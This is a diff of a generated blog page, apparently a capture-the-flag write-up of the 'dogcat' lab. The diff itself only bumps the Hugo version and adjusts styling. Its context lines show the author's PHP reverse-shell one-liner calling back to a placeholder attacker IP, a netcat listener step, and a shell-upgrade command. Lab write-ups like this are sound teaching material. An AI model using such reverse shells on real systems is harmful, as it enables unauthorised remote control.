@@ -64,7 +64,7 @@
     </script>
 
 
-<meta name="generator" content="Hugo 0.152.2">
+<meta name="generator" content="Hugo 0.157.0">
 
     
     <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/dogcat/">
@@ -281,7 +281,7 @@ i modified the request as following<br>
 and get the following :</p>
 <p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224073420.png" alt="">cool we can see that we are www-data</p>
 <p>so now that we have remote code execution we can get a reverse shell , we know that the system has php installed so i tried the following line</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;YOUr_IP&#34;,PORT);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;YOUr_IP&#34;,PORT);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
 </span></span></code></pre></div><p>just replace the cmd with that then select the cmd value , press CONVERT SELEECTION -&gt; URL -&gt; URL ENCODE</p>
 <p>also start nc on ehat port u want logic<br>
 and bam we have a reverse shell<br>
@@ -290,7 +290,7 @@ cool lets look around ,<br>
 <img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224075329.png" alt=""><br>
 and we found the first flag<br>
 i pugradeed the shell with</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>SHELL<span style="color:#f92672">=</span>/bin/bash script -q /dev/null
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>SHELL<span style="color:#f92672">=</span>/bin/bash script -q /dev/null
 </span></span></code></pre></div><p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224075510.png" alt=""><br>
 ok cool now lets try to priv esc<br>
 <img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260224075930.png" alt=""><br>
